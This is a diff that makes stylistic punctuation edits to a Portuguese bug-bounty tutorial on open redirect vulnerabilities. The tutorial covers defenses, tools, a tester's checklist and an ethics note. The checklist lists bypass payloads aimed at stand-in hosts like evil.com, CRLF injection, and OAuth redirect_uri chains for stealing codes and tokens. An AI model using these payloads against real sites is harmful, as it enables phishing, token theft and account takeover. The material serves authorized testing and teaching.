@@ -412,13 +412,13 @@ if (!ALLOWED_HOSTS.contains(uri.getHost())) {     // getHost() ignora userinfo
 return "redirect:" + uri;
 ```
 
-O segredo é usar **`hostname`/`getHost()`** do parser — ele extrai o host real (descartando o `user@`) e você compara com **igualdade exata**, nunca `startsWith`/`contains`/`endsWith`.
+O segredo é usar **`hostname`/`getHost()`** do parser: ele extrai o host real (descartando o `user@`) e você compara com **igualdade exata**, nunca `startsWith`/`contains`/`endsWith`.
 
 **4. Defesa de profundidade:**
-- **Página de confirmação:** pra redirects de saída inevitáveis (trackers), mostre *"você está saindo de alvo.com para X. Continuar?"* — a OWASP recomenda isso explicitamente.
-- **No OAuth, `redirect_uri` em allowlist EXATA** (match completo da URL, **não** "começa com") — assim, nem que exista um open redirect no app o `code` consegue ser repassado pra fora pelo `redirect_uri`. (Detalhe no post [Account Takeover](/posts/account-takeover/).)
-- **`code`/token de uso único e validade curtíssima**, e **fragment não logada** — reduz a janela de roubo via Referer.
-- **`Referrer-Policy: no-referrer`** em páginas que carregam segredos na URL — corta o vazamento de `code`/token pro destino do redirect.
+- **Página de confirmação:** pra redirects de saída inevitáveis (trackers), mostre *"você está saindo de alvo.com para X. Continuar?"*. A OWASP recomenda isso explicitamente.
+- **No OAuth, `redirect_uri` em allowlist EXATA** (match completo da URL, **não** "começa com"). Assim, nem que exista um open redirect no app o `code` consegue ser repassado pra fora pelo `redirect_uri`. (Detalhe no post [Account Takeover](/posts/account-takeover/).)
+- **`code`/token de uso único e validade curtíssima**, e **fragment não logada**, reduzindo a janela de roubo via Referer.
+- **`Referrer-Policy: no-referrer`** em páginas que carregam segredos na URL: corta o vazamento de `code`/token pro destino do redirect.
 
 > ❌ **O que NÃO basta:**
 > - Validar com `startsWith("https://alvo.com")` → quebra com `https://alvo.com@evil.com` e `https://alvo.com.evil.com`.
@@ -429,10 +429,10 @@ O segredo é usar **`hostname`/`getHost()`** do parser — ele extrai o host rea
 
 ## Ferramentas + labs legais
 
-- **Burp Suite** — Repeater (confirmar, com *Follow redirects* **desligado** pra ver o `Location`), Intruder (rodar wordlist de bypass no parâmetro), Collaborator (capturar o `code`/callback fora).
-- **gau / waybackurls / katana** — coletar URLs e achar parâmetros de redirect (apresentados no post [Recon & Discovery](/posts/recon-discovery/)).
-- **gf** (com o pattern `redirect`) — filtrar candidatos automaticamente do output do `gau`.
-- **OpenRedireX** — fuzzer dedicado de open redirect (recebe lista de URLs + payloads e testa os bypasses).
+- **Burp Suite:** Repeater (confirmar, com *Follow redirects* **desligado** pra ver o `Location`), Intruder (rodar wordlist de bypass no parâmetro), Collaborator (capturar o `code`/callback fora).
+- **gau / waybackurls / katana:** coletar URLs e achar parâmetros de redirect (apresentados no post [Recon & Discovery](/posts/recon-discovery/)).
+- **gf** (com o pattern `redirect`) filtra candidatos automaticamente do output do `gau`.
+- **OpenRedireX:** fuzzer dedicado de open redirect (recebe lista de URLs + payloads e testa os bypasses).
 - **Labs pra praticar (autorizados):** [PortSwigger — OAuth 2.0 vulnerabilities](https://portswigger.net/web-security/oauth) (o lab de roubo de `code` via open redirect é ouro), [PortSwigger — DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection), TryHackMe, HackTheBox, HackingClub.
 
 ## Checklist do caçador
@@ -441,10 +441,10 @@ O segredo é usar **`hostname`/`getHost()`** do parser — ele extrai o host rea
 - [ ] Testei a família de parâmetros: `url`, `next`, `return(To)`, `dest`, `continue`, `callback`, `redirect_uri`, `rurl`, `go`, `u`.
 - [ ] Confirmei no Repeater com **Follow redirects desligado** (header-based) e no browser (DOM-based).
 - [ ] Rodei os bypasses: `//evil.com`, `/\evil.com`, `https:evil.com`, `https://alvo.com@evil.com`, `alvo.com.evil.com`, encoding/double-encoding.
-- [ ] Testei **CRLF** no parâmetro (`%0d%0a`) — se a quebra de linha vaza pro `Location`, pode virar header injection/XSS.
+- [ ] Testei **CRLF** no parâmetro (`%0d%0a`); se a quebra de linha vaza pro `Location`, pode virar header injection/XSS.
 - [ ] Verifiquei se o parâmetro vive em **endpoint de OAuth/callback** (`redirect_uri`, `/callback`, `/sso`) → potencial **token theft**. Testei também anexar `/../` ao `redirect_uri` whitelisted.
 - [ ] Tentei usar o redirect pra **furar allowlist de SSRF** ou de saída.
-- [ ] Documentei a **chain/impacto** (não só "redireciona pro Google") — é o que tira do balde informativo.
+- [ ] Documentei a **chain/impacto** (não só "redireciona pro Google"): é o que tira do balde informativo.
 - [ ] Conferi se open redirect **isolado** está no escopo do programa.
 
 ## Pegadinhas / o que NÃO funciona
@@ -462,11 +462,11 @@ O segredo é usar **`hostname`/`getHost()`** do parser — ele extrai o host rea
 - **Bypass é discrepância de parsing:** `//`, `\`, `@` no userinfo, sufixo de domínio, encoding. Valide host com **parser**, nunca com substring.
 - **Defesa que mata a classe:** mapa de IDs no servidor, ou caminho relativo, ou allowlist por **host exato parseado**.
 
-> 💡 **Dica de ouro:** quando achar um open redirect, não pergunte *"quanto isso vale?"* — pergunte *"onde isso me leva?"*. Se ele estiver perto de um fluxo OAuth, de um fetcher server-side ou de um e-mail transacional, você não tem um redirect: você tem um **trampolim pra algo crítico**.
+> 💡 **Dica de ouro:** quando achar um open redirect, não pergunte *"quanto isso vale?"*, e sim *"onde isso me leva?"*. Se ele estiver perto de um fluxo OAuth, de um fetcher server-side ou de um e-mail transacional, você não tem um redirect: você tem um **trampolim pra algo crítico**.
 
 ## Nota ética
 
-Tudo aqui é pra **testes autorizados** — programas de bug bounty (dentro do escopo), pentests contratados e labs legais. Testar redirects e, principalmente, chains de roubo de token em sistemas de terceiros sem autorização é crime — e desnecessário, dado que os labs da PortSwigger reproduzem exatamente esses cenários. Ao demonstrar a chain de OAuth, **nunca** use a conta de uma pessoa real sem consentimento; use duas contas de teste suas. Use pra proteger, reportar com responsabilidade e ensinar.
+Tudo aqui é pra **testes autorizados**: programas de bug bounty (dentro do escopo), pentests contratados e labs legais. Testar redirects e, principalmente, chains de roubo de token em sistemas de terceiros sem autorização é crime, e desnecessário, dado que os labs da PortSwigger reproduzem exatamente esses cenários. Ao demonstrar a chain de OAuth, **nunca** use a conta de uma pessoa real sem consentimento; use duas contas de teste suas. Use pra proteger, reportar com responsabilidade e ensinar.
 
 ## Referências
 
@@ -481,7 +481,7 @@ Tudo aqui é pra **testes autorizados** — programas de bug bounty (dentro do e
 - [PayloadsAllTheThings — Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md) (wordlist de bypass pronta)
 
 ---
-*Este post é o **trampolim** da série — ele alimenta três outros: [Account Takeover](/posts/account-takeover/) (onde a chain de `redirect_uri` → roubo de `code`/token vira ATO), [SSRF](/posts/ssrf/) (onde o redirect fura a allowlist de saída) e [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) (onde ele entra como gadget de chains maiores). Vizinho de classe: [CRLF Injection](/posts/crlf-request-smuggling/). Base: [Recon & Discovery](/posts/recon-discovery/) · calibre o impacto em [Severidade & Impacto](/posts/severidade-impacto-triagem/).*
+*Este post é o **trampolim** da série, e alimenta três outros: [Account Takeover](/posts/account-takeover/) (onde a chain de `redirect_uri` → roubo de `code`/token vira ATO), [SSRF](/posts/ssrf/) (onde o redirect fura a allowlist de saída) e [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) (onde ele entra como gadget de chains maiores). Vizinho de classe: [CRLF Injection](/posts/crlf-request-smuggling/). Base: [Recon & Discovery](/posts/recon-discovery/) · calibre o impacto em [Severidade & Impacto](/posts/severidade-impacto-triagem/).*
 
 ---
 
